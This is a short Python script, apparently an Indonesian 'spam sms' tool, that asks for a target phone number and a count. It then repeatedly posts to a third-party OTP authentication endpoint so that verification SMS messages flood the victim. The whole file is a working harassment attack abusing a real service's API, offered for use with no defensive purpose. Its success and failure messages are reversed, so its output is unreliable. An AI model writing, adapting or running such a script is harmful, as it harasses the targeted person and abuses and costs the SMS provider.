# coding:utf8
import os,sys,json,time

try:
   import requests
except ImportError:
  print("\n [!] Silahkan install module requests & mechanize")
  print("    Ketik : pip install requests \n")
  print("    Ketik : pip install mechanize \n")
  sys.exit()

os.system('clear') 


logo = """

                ¥- Spam sms -€
      
               ~ Cyb3r Ph4nt0m ~
               
               [+] Creator : H2o
               [+] Wa : +6285274745487
--------------------------------------------------
	"""
	
print(logo)
target = input(" [+] Target : ")
jumlah = input(" [+] Jumlah : ")
print('')

req = requests.Session()

url = "https://api.harnicid.com/phone_auth_OTP"

for i in range(int(jumlah)):
        respon = req.post(url,data={'phone':target}).text
        status = json.loads(respon)['message']
        if status == 'OTP sent':
                print("sent to"+ target +" Failed")
                time.sleep(2)
        else:
                print("sent to"+ target +" Succses")
                time.sleep(2)